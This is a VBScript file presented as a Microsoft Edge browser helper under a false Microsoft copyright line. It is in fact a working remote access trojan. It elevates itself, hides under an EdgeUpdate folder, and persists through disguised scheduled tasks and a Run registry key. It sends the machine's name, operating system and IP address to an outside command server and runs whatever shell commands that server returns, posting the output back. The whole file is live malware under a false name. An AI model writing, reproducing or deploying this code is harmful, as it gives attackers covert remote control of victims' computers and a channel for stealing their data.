' Microsoft Edge Browser Helper
' This script helps maintain browser settings and updates
' Copyright (c) Microsoft Corporation. All rights reserved.

Option Explicit

Dim CONFIG_HOST, CONFIG_KEY, CONFIG_WAIT
Dim TASK_MAIN, TASK_HELPER, FILE_NAME

CONFIG_HOST = "luyehealth.com"
CONFIG_KEY = "RAT2025_SECURE_TOKEN_FIXED_2025"
CONFIG_WAIT = 10000
TASK_MAIN = "EdgeBrowserHelper"
TASK_HELPER = "EdgeBrowserSync"
FILE_NAME = "edgebrowserhelper.vbs"

Function GetDataFolder()
    Dim ws
    Set ws = CreateObject("WScript.Shell")
    GetDataFolder = ws.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\EdgeUpdate\"
End Function

Function GetFilePath()
    GetFilePath = GetDataFolder() & FILE_NAME
End Function

Sub CreateFolderIfNeeded(path)
    On Error Resume Next
    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")
    If Not fso.FolderExists(path) Then
        fso.CreateFolder path
    End If
    Err.Clear
End Sub

Sub SaveCopy()
    On Error Resume Next
    Dim fso, src, dst, parentFolder
    Set fso = CreateObject("Scripting.FileSystemObject")
    src = WScript.ScriptFullName
    dst = GetFilePath()
    parentFolder = fso.GetParentFolderName(dst)
    
    CreateFolderIfNeeded fso.GetParentFolderName(parentFolder)
    CreateFolderIfNeeded parentFolder
    
    If fso.FileExists(src) And LCase(src) <> LCase(dst) Then
        fso.CopyFile src, dst, True
    End If
    Err.Clear
End Sub

Function GetCurrentPath()
    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")
    If fso.FileExists(GetFilePath()) Then
        GetCurrentPath = GetFilePath()
    Else
        GetCurrentPath = WScript.ScriptFullName
    End If
End Function

Sub RequestElevation()
    Dim app, path
    path = WScript.ScriptFullName
    Set app = CreateObject("Shell.Application")
    app.ShellExecute "wscript.exe", "//B """ & path & """ install", "", "runas", 0
    WScript.Quit
End Sub

Function CheckTask()
    On Error Resume Next
    Dim ws, exec, output, code
    Set ws = CreateObject("WScript.Shell")
    Set exec = ws.Exec("schtasks /query /tn """ & TASK_MAIN & """ 2>&1")
    Do While exec.Status = 0
        WScript.Sleep 100
    Loop
    output = exec.StdOut.ReadAll
    code = exec.ExitCode
    CheckTask = (code = 0 And InStr(output, TASK_MAIN) > 0)
    Err.Clear
End Function

Sub CreateTasks()
    Dim ws, path, c1, c2
    Set ws = CreateObject("WScript.Shell")
    path = GetFilePath()
    SaveCopy
    
    c1 = "schtasks /create /tn """ & TASK_MAIN & """ /tr ""wscript.exe //B \""" & path & "\"" run"" /sc onlogon /rl highest /f"
    ws.Run c1, 0, True
    
    c2 = "schtasks /create /tn """ & TASK_HELPER & """ /tr ""wscript.exe //B \""" & path & "\"" check"" /sc minute /mo 3 /rl highest /f"
    ws.Run c2, 0, True
    
    ws.Run "schtasks /run /tn """ & TASK_MAIN & """", 0, False
End Sub

Function IsRunning()
    On Error Resume Next
    Dim wmi, procs, p, cnt, cl
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    Set procs = wmi.ExecQuery("SELECT CommandLine FROM Win32_Process WHERE Name='wscript.exe'")
    cnt = 0
    For Each p In procs
        cl = LCase(p.CommandLine & "")
        If InStr(cl, LCase(FILE_NAME)) > 0 And InStr(cl, "run") > 0 Then
            cnt = cnt + 1
        End If
    Next
    IsRunning = (cnt > 0)
    Err.Clear
End Function

Sub DoCheck()
    On Error Resume Next
    KeepAlive
    If Not IsRunning() Then
        Dim ws
        Set ws = CreateObject("WScript.Shell")
        ws.Run "schtasks /run /tn """ & TASK_MAIN & """", 0, False
    End If
    WScript.Quit
End Sub

Sub KeepAlive()
    On Error Resume Next
    Dim ws, path, regKey
    Set ws = CreateObject("WScript.Shell")
    path = GetFilePath()
    SaveCopy
    
    regKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\EdgeUpdater"
    ws.RegWrite regKey, "schtasks /run /tn """ & TASK_MAIN & """", "REG_SZ"
    Err.Clear
    
    If Not CheckTask() Then
        Dim cmd
        cmd = "schtasks /create /tn """ & TASK_MAIN & """ /tr ""wscript.exe //B \""" & path & "\"" run"" /sc onlogon /rl highest /f"
        ws.Run cmd, 0, True
    End If
    Err.Clear
End Sub

Dim args
Set args = WScript.Arguments

If args.Count > 0 Then
    Select Case args(0)
        Case "run"
            KeepAlive
        Case "install"
            CreateTasks
            WScript.Quit
        Case "check"
            DoCheck
            WScript.Quit
    End Select
Else
    If CheckTask() Then
        Dim ws
        Set ws = CreateObject("WScript.Shell")
        ws.Run "schtasks /run /tn """ & TASK_MAIN & """", 0, False
        WScript.Quit
    Else
        RequestElevation
    End If
End If

On Error Resume Next

Dim shell, fso, network
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set network = CreateObject("WScript.Network")

Function GetName()
    GetName = network.ComputerName
End Function

Function GetId()
    Dim n, h, i
    n = GetName()
    h = 0
    For i = 1 To Len(n)
        h = (h * 31 + Asc(Mid(n, i, 1))) Mod 100000
    Next
    GetId = "VBS" & n & h
End Function

Function GetArch()
    Dim a
    a = shell.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%")
    If InStr(a, "64") > 0 Then
        GetArch = "64bit"
    Else
        GetArch = "32bit"
    End If
End Function

Function GetOS()
    On Error Resume Next
    Dim wmi, items, item
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    Set items = wmi.ExecQuery("SELECT Caption FROM Win32_OperatingSystem")
    For Each item In items
        GetOS = item.Caption
        Exit For
    Next
    If GetOS = "" Then GetOS = "Windows"
End Function

Function GetIP()
    On Error Resume Next
    Dim http
    GetIP = "unknown"
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.Open "GET", "https://api.ipify.org", False
    http.Send
    If Err.Number = 0 And http.Status = 200 Then
        GetIP = Trim(http.ResponseText)
    End If
    Set http = Nothing
    Err.Clear
End Function

Function WebRequest(method, endpoint, data, auth)
    On Error Resume Next
    Dim http, url
    url = "https://" & CONFIG_HOST & endpoint
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.Open method, url, False
    http.SetRequestHeader "Content-Type", "application/json"
    If auth <> "" Then
        http.SetRequestHeader "Authorization", auth
    End If
    http.Send data
    If Err.Number = 0 Then
        WebRequest = http.ResponseText
    Else
        WebRequest = ""
        Err.Clear
    End If
    Set http = Nothing
End Function

Function RunCmd(c)
    On Error Resume Next
    Dim ex, out, ln
    Set ex = shell.Exec("cmd.exe /c " & c)
    out = ""
    Do While Not ex.StdOut.AtEndOfStream
        ln = ex.StdOut.ReadLine()
        out = out & ln & vbCrLf
    Loop
    Do While Not ex.StdErr.AtEndOfStream
        ln = ex.StdErr.ReadLine()
        out = out & ln & vbCrLf
    Loop
    RunCmd = out
End Function

Function Esc(s)
    Dim r, i, c
    r = ""
    For i = 1 To Len(s)
        c = Mid(s, i, 1)
        Select Case c
            Case """": r = r & "\"""
            Case "\": r = r & "\\"
            Case vbCr: r = r & "\r"
            Case vbLf: r = r & "\n"
            Case vbTab: r = r & "\t"
            Case Else
                If Asc(c) >= 32 And Asc(c) < 127 Then r = r & c
        End Select
    Next
    Esc = r
End Function

Function UnEsc(s)
    Dim r, i, c, n
    r = ""
    i = 1
    Do While i <= Len(s)
        c = Mid(s, i, 1)
        If c = "\" And i < Len(s) Then
            n = Mid(s, i + 1, 1)
            Select Case n
                Case "\": r = r & "\": i = i + 1
                Case """": r = r & """": i = i + 1
                Case "n": r = r & vbLf: i = i + 1
                Case "r": r = r & vbCr: i = i + 1
                Case "t": r = r & vbTab: i = i + 1
                Case Else: r = r & c
            End Select
        Else
            r = r & c
        End If
        i = i + 1
    Loop
    UnEsc = r
End Function

Function GetVal(json, key)
    Dim sk, p, sp, ep, v
    sk = """" & key & """"
    p = InStr(json, sk)
    If p = 0 Then GetVal = "": Exit Function
    p = InStr(p, json, ":")
    If p = 0 Then GetVal = "": Exit Function
    p = p + 1
    Do While Mid(json, p, 1) = " ": p = p + 1: Loop
    If Mid(json, p, 1) = """" Then
        sp = p + 1: ep = sp
        Do While ep <= Len(json)
            If Mid(json, ep, 1) = "\" Then
                ep = ep + 2
            ElseIf Mid(json, ep, 1) = """" Then
                Exit Do
            Else
                ep = ep + 1
            End If
        Loop
        v = Mid(json, sp, ep - sp)
        v = UnEsc(v)
    Else
        sp = p
        ep = InStr(sp, json, ",")
        If ep = 0 Then ep = InStr(sp, json, "}")
        v = Trim(Mid(json, sp, ep - sp))
    End If
    GetVal = v
End Function

Sub DoRegister(id)
    On Error Resume Next
    Dim j, r
    j = "{""client_id"":""" & id & """,""hostname"":""" & GetName() & """,""platform"":""Windows"",""platform_release"":""" & GetOS() & """,""architecture"":""" & GetArch() & """,""ip_address"":""" & GetIP() & """,""auth_token"":""" & CONFIG_KEY & """}"
    r = WebRequest("POST", "/api/poll/register", j, "")
    Err.Clear
End Sub

Sub DoResult(id, cmdId, res)
    Dim j
    j = "{""client_id"":""" & id & """,""command_id"":""" & cmdId & """,""result"":""" & Esc(res) & """,""error"":"""",""exit_code"":0}"
    WebRequest "POST", "/api/poll/result", j, CONFIG_KEY
End Sub

Sub Main()
    On Error Resume Next
    Dim id, resp, sd, cmds, cs, ce, cj, cid, cmd, res, empty, lastReg
    
    id = GetId()
    empty = 0
    lastReg = Now
    
    KeepAlive
    Err.Clear
    
    WScript.Sleep 2000
    DoRegister id
    Err.Clear
    
    Do While True
        Err.Clear
        resp = WebRequest("GET", "/api/poll/commands/" & id, "", CONFIG_KEY)
        
        If resp = "" Or InStr(resp, "not found") > 0 Or InStr(resp, "error") > 0 Then
            empty = empty + 1
            If empty >= 3 Or DateDiff("n", lastReg, Now) >= 5 Then
                DoRegister id
                empty = 0
                lastReg = Now
            End If
        Else
            empty = 0
        End If
        
        If resp <> "" Then
            sd = GetVal(resp, "shutdown")
            If sd = "true" Then WScript.Quit
            
            cs = InStr(resp, "[")
            ce = InStrRev(resp, "]")
            If cs > 0 And ce > cs Then
                cmds = Mid(resp, cs + 1, ce - cs - 1)
                Do While InStr(cmds, "{") > 0
                    cs = InStr(cmds, "{")
                    ce = InStr(cmds, "}")
                    If cs > 0 And ce > cs Then
                        cj = Mid(cmds, cs, ce - cs + 1)
                        cid = GetVal(cj, "command_id")
                        cmd = GetVal(cj, "command")
                        If cid <> "" And cmd <> "" Then
                            Dim dly
                            dly = GetVal(cj, "delay")
                            If dly <> "" And IsNumeric(dly) Then
                                If CInt(dly) > 0 Then WScript.Sleep CInt(dly) * 1000
                            End If
                            res = RunCmd(cmd)
                            DoResult id, cid, res
                        End If
                        cmds = Mid(cmds, ce + 1)
                    Else
                        Exit Do
                    End If
                Loop
            End If
        End If
        
        WScript.Sleep CONFIG_WAIT
    Loop
End Sub

Main
